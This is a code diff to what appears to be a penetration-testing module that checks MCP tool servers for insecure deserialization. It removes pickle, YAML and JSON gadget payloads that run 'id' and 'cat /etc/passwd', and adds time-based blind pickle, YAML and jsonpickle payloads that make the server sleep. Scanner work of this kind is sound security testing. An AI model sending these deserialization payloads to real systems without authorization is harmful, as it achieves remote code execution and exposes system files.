@@ -1,6 +1,6 @@
 """Insecure deserialization tests for MCP tools"""
 import base64
-import pickle
+import time
 
 
 class DeserializationTest:
@@ -9,27 +9,22 @@ class DeserializationTest:
     def __init__(self, pentester):
         self.pentester = pentester
     
-    # Python pickle gadgets (detection-safe)
-    PICKLE_PAYLOADS = [
-        # Canary: attempts to import os (detectable via error)
-        base64.b64encode(b"cos\nsystem\n(S'echo PICKLE-RCE'\ntR.").decode(),
-        # Class instantiation probe
-        base64.b64encode(pickle.dumps({'__reduce__': ('os.system', ('id',))})).decode(),
-    ]
-    
-    # YAML deserialization
-    YAML_PAYLOADS = [
-        "!!python/object/apply:os.system ['id']",
-        "!!python/object/new:subprocess.check_output [['id']]",
-        '!!python/object/apply:subprocess.Popen [["cat", "/etc/passwd"]]',
-    ]
-    
-    # JSON with class hints (Jackson, FastJSON style)
-    JSON_GADGETS = [
-        '{"@type":"java.lang.Runtime"}',
-        '{"__class__": "subprocess.Popen", "__args__": [["id"]]}',
-        '{"$type": "System.Diagnostics.Process, System"}',
-    ]
+    def _generate_valid_payload(self, tool, override_args=None):
+        """Generate schema-compliant payloads"""
+        override_args = override_args or {}
+        schema = tool.get('inputSchema', {})
+        args = {}
+        
+        for prop, spec in schema.get('properties', {}).items():
+            if prop in override_args:
+                args[prop] = override_args[prop]
+            elif spec.get('type') == 'string':
+                args[prop] = "test"
+            elif spec.get('type') in ['integer', 'number']:
+                args[prop] = 1
+            elif spec.get('type') == 'boolean':
+                args[prop] = True
+        return {"name": tool['name'], "arguments": args}
     
     def run(self, tool):
         """Test for deserialization vulnerabilities"""
@@ -38,83 +33,116 @@ class DeserializationTest:
         schema = tool.get('inputSchema', {})
         
         for arg, spec in schema.get('properties', {}).items():
-            # Test pickle (base64-encoded binary args)
-            if 'base64' in arg.lower() or 'data' in arg.lower() or 'payload' in arg.lower():
-                findings.extend(self._test_pickle(tool, arg))
-            
-            # Test YAML
-            if 'yaml' in arg.lower() or 'config' in arg.lower():
-                findings.extend(self._test_yaml(tool, arg))
-            
-            # Test JSON gadgets (for any string arg)
             if spec.get('type') == 'string':
+                desc = spec.get('description', '').lower()
+                name = arg.lower()
+                is_suspicious = any(k in name or k in desc for k in 
+                    ['base64', 'token', 'state', 'data', 'obj', 'key', 'payload', 'serial'])
+                
+                findings.extend(self._test_yaml(tool, arg))
                 findings.extend(self._test_json_gadgets(tool, arg))
+                
+                if is_suspicious:
+                    findings.extend(self._test_pickle(tool, arg))
         
         return findings
     
     def _test_pickle(self, tool, arg):
         findings = []
-        for payload in self.PICKLE_PAYLOADS:
-            try:
-                params = {"name": tool['name'], "arguments": {arg: payload}}
-                _, _ = self.pentester.send("tools/call", params)
-                
-                if self.pentester.detector.findings:
-                    findings.append({
-                        'type': 'PICKLE_DESERIALIZATION',
-                        'tool': tool['name'],
-                        'arg': arg,
-                        'payload': payload[:50] + '...',
-                        'severity': 'CRITICAL',
-                        'detections': self.pentester.detector.report()
-                    })
-                    self.pentester.detector.findings = []
-            except (RuntimeError, IOError, OSError, KeyError) as e:
-                print(f"[!] Pickle test error for {tool['name']}.{arg}: {e}")
+        # Time-based blind RCE: __import__('time').sleep(4)
+        blind_payload = base64.b64encode(
+            b'\x80\x03cbuiltins\neval\nX\x1c\x00\x00\x00__import__("time").sleep(4)\x85R.'
+        ).decode()
+        
+        try:
+            params = self._generate_valid_payload(tool, {arg: blind_payload})
+            start = time.time()
+            self.pentester.send("tools/call", params)
+            duration = time.time() - start
+            
+            if duration > 3.5:
+                findings.append({
+                    'type': 'PICKLE_DESERIALIZATION_BLIND',
+                    'tool': tool['name'],
+                    'arg': arg,
+                    'severity': 'CRITICAL',
+                    'note': f'Execution delayed {duration:.2f}s (sleep payload)'
+                })
+        except Exception:
+            pass
+        
         return findings
     
     def _test_yaml(self, tool, arg):
         findings = []
-        for payload in self.YAML_PAYLOADS:
+        payloads = [
+            "!!python/object/apply:time.sleep [4]",
+            "!!python/object/apply:os.system ['sleep 4']",
+        ]
+        
+        for payload in payloads:
             try:
-                params = {"name": tool['name'], "arguments": {arg: payload}}
+                params = self._generate_valid_payload(tool, {arg: payload})
+                start = time.time()
                 resp, _ = self.pentester.send("tools/call", params)
+                duration = time.time() - start
                 
-                # Check for execution indicators
-                if self.pentester.detector.findings or 'uid=' in str(resp):
+                if duration > 3.5:
                     findings.append({
                         'type': 'YAML_DESERIALIZATION',
                         'tool': tool['name'],
                         'arg': arg,
-                        'payload': payload,
-                        'severity': 'CRITICAL'
+                        'severity': 'CRITICAL',
+                        'note': f'Server slept {duration:.2f}s'
                     })
-                    self.pentester.detector.findings = []
-            except (RuntimeError, IOError, OSError, KeyError) as e:
-                print(f"[!] YAML test error for {tool['name']}.{arg}: {e}")
+                    break
+                
+                if resp and 'ConstructorError' in str(resp):
+                    findings.append({
+                        'type': 'YAML_UNSAFE_LOAD_HINT',
+                        'tool': tool['name'],
+                        'arg': arg,
+                        'severity': 'MEDIUM',
+                        'note': 'YAML parsing detected'
+                    })
+            except Exception:
+                pass
         return findings
     
     def _test_json_gadgets(self, tool, arg):
         findings = []
-        for payload in self.JSON_GADGETS:
+        gadgets = [
+            '{"py/object": "time.sleep", "py/arg": 4}',  # jsonpickle
+            '{"py/reduce": [{"py/type": "time.sleep"}, {"py/tuple": [4]}]}',
+            '{"@type":"java.lang.Runtime"}',  # Jackson
+        ]
+        
+        for payload in gadgets:
             try:
-                params = {"name": tool['name'], "arguments": {arg: payload}}
+                params = self._generate_valid_payload(tool, {arg: payload})
+                start = time.time()
                 resp, _ = self.pentester.send("tools/call", params)
+                duration = time.time() - start
                 
-                # Look for class instantiation errors (indicates parsing attempt)
+                if duration > 3.5:
+                    findings.append({
+                        'type': 'JSON_GADGET_RCE',
+                        'tool': tool['name'],
+                        'arg': arg,
+                        'severity': 'CRITICAL',
+                        'note': f'jsonpickle/gadget executed ({duration:.2f}s)'
+                    })
+                    break
+                
                 content = str(resp)
-                if any(ind in content for ind in ['ClassNotFoundException', 
-                                                    'cannot unmarshal', 
-                                                    'type not found',
-                                                    'autoType']):
+                if any(ind in content for ind in ['ClassNotFoundException', 'autoType', 'py/object']):
                     findings.append({
                         'type': 'JSON_GADGET_PARSED',
                         'tool': tool['name'],
                         'arg': arg,
-                        'payload': payload,
                         'severity': 'HIGH',
-                        'note': 'Server attempted to resolve type hint'
+                        'note': 'Type hint processed'
                     })
-            except (RuntimeError, IOError, OSError, KeyError) as e:
-                print(f"[!] JSON gadget test error for {tool['name']}.{arg}: {e}")
+            except Exception:
+                pass
         return findings
